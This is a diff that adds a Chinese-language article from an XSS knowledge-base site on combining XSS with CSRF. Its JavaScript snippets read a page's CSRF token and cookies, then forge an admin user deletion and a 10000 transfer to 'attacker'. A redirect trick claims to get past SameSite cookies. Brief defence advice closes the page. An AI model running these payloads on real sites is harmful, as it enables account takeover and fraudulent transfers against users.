@@ -1,0 +1,33 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="shortcut icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="apple-touch-icon" href="../tu/xssicon.png">
+    <title>XSS与CSRF组合攻击 - XSS安全知识库</title><meta name="description" content="XSS结合CSRF的高级攻击技术,绕过CSRF防护,实现强大的攻击链"><meta name="keywords" content="XSS CSRF组合,攻击链,CSRF绕过,高级攻击"><meta name="author" content="蓝莲花XSS平台"><meta property="og:title" content="XSS与CSRF组合攻击"><meta property="og:description" content="XSS结合CSRF的高级攻击技术"><meta property="og:type" content="article"><title>XSS与CSRF组合攻击 - XSS安全知识库</title><link href="../static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet"><link rel="stylesheet" href="../static/libs/fontawesome/css/all.min.css"><link rel="stylesheet" href="../static/css/style.css"><link rel="stylesheet" href="../static/libs/prism/css/prism-tomorrow.min.css"><style>:root{--neon-green:#00ff41;--bg-primary:#0a0e27;--bg-secondary:#151932;--text-primary:#e0e0e0;--text-secondary:#b0b0b0;--border-color:rgba(0,255,65,0.2);--cyan:#00d9ff}*{margin:0;padding:0;box-sizing:border-box}body{background:var(--bg-primary);color:var(--text-primary);font-family:'Segoe UI',sans-serif;line-height:1.7}.article-header{background:linear-gradient(135deg,var(--bg-secondary),var(--bg-primary));padding:3rem 0;border-bottom:2px solid var(--border-color)}.breadcrumb{background:transparent;margin-bottom:1.5rem}.breadcrumb-item{color:var(--text-secondary)}.breadcrumb-item a{color:var(--neon-green);text-decoration:none}.article-title{font-size:2.5rem;font-weight:700;color:var(--neon-green);margin-bottom:1rem}.article-meta{color:var(--text-secondary);font-size:0.95rem}.main-content{padding:3rem 0}.article-content{background:var(--bg-secondary);border:1px solid var(--border-color);border-radius:8px;padding:2rem}.article-content h2{color:var(--neon-green);font-size:1.8rem;margin:2rem 0 1rem 0;border-bottom:2px solid var(--border-color);padding-bottom:0.5rem}.article-content h3{color:var(--cyan);font-size:1.4rem;margin:1.5rem 0 1rem 0}.article-content p{color:var(--text-secondary);margin-bottom:1rem}.article-content ul{color:var(--text-secondary);margin-bottom:1rem;padding-left:2rem}.article-content strong{color:var(--neon-green)}.code-block{background:#1e1e1e;border:1px solid var(--border-color);border-radius:8px;margin:1rem 0;overflow-x:auto}.code-block pre{margin:0;padding:1rem;color:#e0e0e0}.warning-box{background:rgba(255,193,7,0.1);border-left:4px solid #ffc107;padding:1rem;margin:1rem 0}.back-to-top{position:fixed;bottom:40px;right:40px;width:50px;height:50px;background:var(--neon-green);color:#000;border:none;border-radius:50%;font-size:1.5rem;cursor:pointer;opacity:0;visibility:hidden;transition:all 0.3s;z-index:1000;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 15px rgba(0,255,65,0.3)}.back-to-top:hover{transform:translateY(-5px);box-shadow:0 6px 20px rgba(0,255,65,0.5)}.back-to-top.show{opacity:1;visibility:visible}</style></head><body><div class="article-header"><div class="container"><nav><ol class="breadcrumb"><li class="breadcrumb-item"><a href="../wiki.html"><i class="fas fa-book"></i> 知识库</a></li><li class="breadcrumb-item active">XSS与CSRF组合攻击</li></ol></nav><h1 class="article-title">XSS与CSRF组合攻击</h1><div class="article-meta"><span><i class="far fa-calendar"></i> 2025年1月</span><span class="mx-3">|</span><span><i class="far fa-clock"></i> 15分钟阅读</span></div></div></div><div class="main-content"><div class="container"><div class="row"><div class="col-lg-10 offset-lg-1"><div class="article-content"><h2>1. XSS+CSRF攻击原理</h2><p>XSS可以读取页面中的CSRF Token,从而绕过CSRF防护机制。</p><div class="code-block"><pre><code>// 利用XSS窃取CSRF Token
+var token = document.querySelector('[name=csrf-token]').content;
+fetch('/admin/delete-user', {
+    method: 'POST',
+    headers: {'X-CSRF-Token': token},
+    body: JSON.stringify({userId: 123})
+});</code></pre></div><h2>2. 组合攻击场景</h2><p>攻击链: 1. XSS获取Token → 2. 伪造合法请求 → 3. 执行敏感操作</p><div class="code-block"><pre><code>// 完整攻击链
+// 步骤1: 读取CSRF Token
+var csrf = document.querySelector('meta[name="csrf-token"]').content;
+
+// 步骤2: 读取用户Session
+var session = document.cookie;
+
+// 步骤3: 执行敏感操作
+fetch('/api/transfer', {
+    method: 'POST',
+    headers: {
+        'X-CSRF-Token': csrf,
+        'Cookie': session
+    },
+    body: JSON.stringify({
+        to: 'attacker',
+        amount: 10000
+    })
+});</code></pre></div><h2>3. 高级利用技术</h2><h3>3.1 绕过SameSite Cookie</h3><div class="code-block"><pre><code>// 利用XSS在同站点执行CSRF
+// SameSite=Strict也无法防御
+window.location = '/transfer?to=attacker&amount=10000';</code></pre></div><h3>3.2 链式攻击</h3><p>XSS → 窃取Token → CSRF攻击 → 权限提升 → 后门植入</p><div class="warning-box"><h4>防御建议</h4><ul><li><strong>双重防护</strong>: 同时防御XSS和CSRF</li><li><strong>Token绑定</strong>: CSRF Token与用户Session绑定</li><li><strong>二次验证</strong>: 敏感操作需要密码确认</li><li><strong>监控告警</strong>: 异常请求实时告警</li></ul></div></div></div></div></div></div><footer style="background:var(--bg-secondary);padding:2rem 0;margin-top:3rem;border-top:2px solid var(--border-color);text-align:center;color:var(--text-secondary)"><div class="container"><p>&copy; 2025 蓝莲花XSS平台</p></div></footer><button class="back-to-top" id="backToTop"><i class="fas fa-arrow-up"></i></button><script src="../static/libs/bootstrap/js/bootstrap.bundle.min.js"></script><script src="../static/libs/prism/js/prism.min.js"></script><script src="../static/libs/prism/js/prism-javascript.min.js"></script><script src="../static/libs/prism/js/prism-markup.min.js"></script><script src="../static/libs/prism/js/prism-php.min.js"></script><script>const b=document.getElementById('backToTop');window.addEventListener('scroll',()=>{b.classList.toggle('show',window.pageYOffset>300)});b.addEventListener('click',()=>window.scrollTo({top:0,behavior:'smooth'}));</script></body></html>
